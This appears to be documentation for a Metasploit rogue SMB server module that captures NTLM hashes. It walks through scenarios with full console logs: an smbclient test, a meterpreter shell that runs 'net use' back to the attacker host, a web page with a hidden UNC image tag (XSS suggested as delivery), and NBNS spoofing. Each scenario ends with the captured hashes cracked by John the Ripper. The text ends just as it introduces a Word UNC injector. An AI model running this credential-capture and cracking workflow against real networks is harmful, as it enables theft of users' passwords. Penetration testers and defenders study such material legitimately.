This module creates a mock SMBv1 server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`.

SMBv1 is enabled by default on system before, and including:

 * Windows XP
 * Windows Server 2008 R2

Microsoft provides an article on how to detect, disable, and enable SMB in various versions
[here](https://support.microsoft.com/en-us/help/2696547/detect-enable-disable-smbv1-smbv2-smbv3-in-windows-and-windows-server)

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/server/capture/smb```
  3. Do: ```run```

## Options

  **CAINPWFILE**

  A file to store Cain & Abel formatted captured hashes in

  **CHALLENGE**

  An 8 byte server challenge.  Default is `1122334455667788`

  **JOHNPWFILE**

  A file to store John the Ripper formatted hashes in

## Scenarios

### Linux Connection via smbclient

Ubuntu 18.04 with `smbclient 4.7.6-Ubuntu` installed.

Based on [shellvoide.com](https://www.shellvoide.com/hacks/how-to-setup-rogue-fake-smb-server-to-capture-credentials/)

You'll need to set `client use spnego = no` under `[global]` in `smb.conf` to ensure SMBv1 compatibility.

Server:

```
msf5 exploit(multi/handler) > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /tmp/john
johnpwfile => /tmp/john
msf5 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
[*] SMB Captured - 2019-09-25 22:44:04 -0400
NTLMv2 Response Captured from 2.2.2.2:50978 - 2.2.2.2
USER:ubuntu DOMAIN:WORKGROUP OS:Unix LM:Samba
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:a6b70b49c8d42903fbe6231ce53a21ff 
NT_CLIENT_CHALLENGE:01010000000000008aee33441474d501f8f62d51f6995359000000000200120057004f0052004b00470052004f005500500000000000
[*] SMB Capture - Empty hash captured from 2.2.2.2:50978 - 2.2.2.2 captured, ignoring ... 
```

Client:

```
root@Kali:~# grep spnego /etc/samba/smb.conf 
client use spnego = no
root@Kali:~# smbclient //1.1.1.1/fake
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

Crack the Hash:

```
# cat /tmp/john_netntlmv2
ubuntu::WORKGROUP:1122334455667788:a6b70b49c8d42903fbe6231ce53a21ff:01010000000000008aee33441474d501f8f62d51f6995359000000000200120057004f0052004b00470052004f005500500000000000
# john /tmp/john_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (ubuntu)
1g 0:00:00:00 DONE (2019-09-25 22:46) 11.11g/s 1865Kp/s 1865Kc/s 1865KC/s 24782478..playpen
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed

```

### Windows XP via net use

Method also confirmed on Windows 2008r2

Based off of [hackers-arise.com](https://www.hackers-arise.com/single-post/2018/11/19/Metasploit-Basics-Part-20-Creating-a-Fake-SMB-Server-to-Capture-Credentials)

The idea here is we have a shell on a Windows box where we can't `hashdump` due to user permissions.
However, we're able to do a `net use` to make an `SMB` connection back to our server to get the
user's hash, then hopefully crack it.

```
meterpreter > getuid
Server username: WINXP\test
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /tmp/john
johnpwfile => /tmp/john
msf5 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/smb) > 
[*] Started service listener on 0.0.0.0:445 
[*] Server started.

msf5 auxiliary(server/capture/smb) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 892 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\test\Desktop>net use \\1.1.1.1 fake

[*] SMB Captured - 2019-09-25 22:26:04 -0400
NTLMv1 Response Captured from 2.2.2.2:1056 - 2.2.2.2
USER:test DOMAIN:WINXP OS:Windows 2002 Service Pack 2 2600 LM:Windows 2002 5.1
LMHASH:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25
NTHASH:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c
net use \\1.1.1.1 fake
System error 1326 has occurred.

Logon failure: unknown user name or bad password.


C:\Documents and Settings\test\Desktop>
```

We're now able to use John the Ripper to crack the password.

```
# cat /tmp/john_netntlm 
test::WINXP:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c:1122334455667788
# john /tmp/john_netntlm --format=netlm  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 1 password hash (netlm, LM C/R [DES 32/64])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
FAKE             (test)
1g 0:00:00:00 DONE (2019-09-25 22:28) 1.333g/s 1398Kp/s 1398Kc/s 1398KC/s 123456..LATISHA1
Use the "--show --format=netlm" options to display all of the cracked passwords reliably
Session completed
```

### UNC in Websites Vector

One way to coax a user into creating an SMB connection is to embed it in a website

First, create the website (we're using Kali for this) with the following content:
```
<html>
<head>
<title>UNC Example</title>
</head>
<body>
<img src="file:////1.1.1.1/fake.jpg" width="0px" height="0px">
</body>
</html>
```

This file, for the example is in `/var/www/html/unc.html`.

Also of note, this could be done via XSS or other injection technique.

Start the webserver: ```service apache2 start```

Server:
```
msf5 > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /tmp/john
johnpwfile => /tmp/john
msf5 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/smb) > 
[*] Started service listener on 0.0.0.0:445 
[*] Server started.
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:957c33ac7e9d7bf4459ddb2c65109aaa 
NT_CLIENT_CHALLENGE:01010000000000007a7e22719474d5014eb86a13abf5f61000000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:e4411aead169063032e832539864b4ff 
NT_CLIENT_CHALLENGE:0101000000000000fd0e3f719474d501ed3acc4801283dee00000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:f09d780a73410902dae21653cc9ef117 
NT_CLIENT_CHALLENGE:0101000000000000bed143719474d5015e71b1d1c6aba91800000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:b9f84605b6cd0feb57c38f5d7251d5e0 
NT_CLIENT_CHALLENGE:01010000000000007f9448719474d50164270f62c422d35200000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:a1f2d3c84c444368bea5cac47707faec 
NT_CLIENT_CHALLENGE:01010000000000003f574d719474d50197b541b568bd9d3600000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:b895915d8c813c99512904bd1b84f2e2 
NT_CLIENT_CHALLENGE:0101000000000000001a52719474d501b8fa9400bb1ff22f00000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:309c3abcd382e8541a811a8d9af66002 
NT_CLIENT_CHALLENGE:0101000000000000c0dc56719474d501cea04f59f7a5dc5a00000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:1378542b978996b23f6f88c8d52b3d22 
NT_CLIENT_CHALLENGE:0101000000000000819f5b719474d501cd5954986a11cd6600000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:425740c14d740ba89aae0533e1c320bb 
NT_CLIENT_CHALLENGE:0101000000000000416260719474d501dc6bac2b5637209b00000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:b291ca93971c18c3fa3f9789c25296c8 
NT_CLIENT_CHALLENGE:0101000000000000022565719474d501d583f2f3dbf2ea0000000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:3a908e59fe9f96a7f871b3aa2155dce1 
NT_CLIENT_CHALLENGE:0101000000000000c2e769719474d5015e8a4d8a139e8eea00000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:2a76fc76174c297712b08e301ac1b08e 
NT_CLIENT_CHALLENGE:010100000000000083aa6e719474d5019684d5d78475e27500000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:5d7057563a44671ec26ec021613f45b4 
NT_CLIENT_CHALLENGE:0101000000000000a4ce75719474d50184900d6f208cb07500000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:ec6ce9d5171e9f5ee017d963797e760c 
NT_CLIENT_CHALLENGE:010100000000000064917a719474d501006e93848f1fb88100000000020000000000000000000000
[*] SMB Captured - 2019-09-26 14:01:37 -0400
NTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:d96937debde3ce251f6889fc1be21a2f 
NT_CLIENT_CHALLENGE:010100000000000025547f719474d5014dd729fda10cf20c00000000020000000000000000000000
```

Client:
```
Browse to the webpage.  This example is on Windows Server 2008r2 with Internet Explorer.
```

Crack the password:
```
# john /tmp/john_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 17 password hashes with 17 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Remaining 15 password hashes with 15 different salts
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
15g 0:00:00:00 DONE (2019-09-26 14:06) 115.3g/s 283569p/s 4253Kc/s 4253KC/s dyesebel..holaz
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

### Spoofing NBNS

If the target(s) are on the local network, it's possible to conduct an `nbns` spoof to attract
additional SMB queries to your host.  This scenario will utilize `auxiliary/spoof/nbns/nbns_response`
to conduct the spoofing.  If a Windows user attempts to browse or mount a network name such as
`\\fake`, the `nbns` module will respond back with the set IP.

This is based on [hackingarticles.in](https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/)

Server side:
```
msf5 > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /tmp/johnnbns
johnpwfile => /tmp/johnnbns
msf5 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/smb) > 
[*] Started service listener on 0.0.0.0:445 
[*] Server started.

msf5 auxiliary(server/capture/smb) > use auxiliary/spoof/nbns/nbns_response
msf5 auxiliary(spoof/nbns/nbns_response) > set spoofip 1.1.1.1
spoofip => 1.1.1.1
msf5 auxiliary(spoof/nbns/nbns_response) > set interface eth0
interface => eth0
msf5 auxiliary(spoof/nbns/nbns_response) > exploit
[*] Auxiliary module running as background job 1.
msf5 auxiliary(spoof/nbns/nbns_response) > 
[*] NBNS Spoofer started. Listening for NBNS requests with REGEX ".*" ...
[+] 2.2.2.2    nbns - FAKE matches regex, responding with 1.1.1.1
[+] 2.2.2.2    nbns - FAKE matches regex, responding with 1.1.1.1
[*] SMB Captured - 2019-09-26 16:19:09 -0400
NTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:5a44b22db99861330e1637f0565f595f 
NT_CLIENT_CHALLENGE:010100000000000022529fa7a774d501b3b3f093392560d600000000020000000000000000000000
[*] SMB Captured - 2019-09-26 16:19:09 -0400
NTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:00837cb572f0116c7544ca0f56d31f5c 
NT_CLIENT_CHALLENGE:0101000000000000c606c3a7a774d501c28ee74be786099100000000020000000000000000000000
[*] SMB Captured - 2019-09-26 16:19:09 -0400
NTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:b571090dea4270b6b6d2b3de39321b29 
NT_CLIENT_CHALLENGE:010100000000000087c9c7a7a774d501c00e467bda8a8b4a00000000020000000000000000000000
[*] SMB Captured - 2019-09-26 16:19:09 -0400
NTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2
USER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:dc28e9e94c6199e814937d61e3956c7d 
NT_CLIENT_CHALLENGE:0101000000000000084fd1a7a774d5014f34895403460b1b00000000020000000000000000000000
```

Victim:
```
Open Explorer and type \\fake
```

Finally, Crack the password:
```
# john /tmp/johnnbns_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
6g 0:00:00:00 DONE (2019-09-26 16:25) 100.0g/s 614400p/s 3686Kc/s 3686KC/s dyesebel..holaz
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

### Word Document UNC Injector

Another strategy is to create content which can entice a user to open, containing a UNC link, and
thus creating an SMB connection.  To accomplish this, we use `auxiliary/docx/word_unc_injector`.

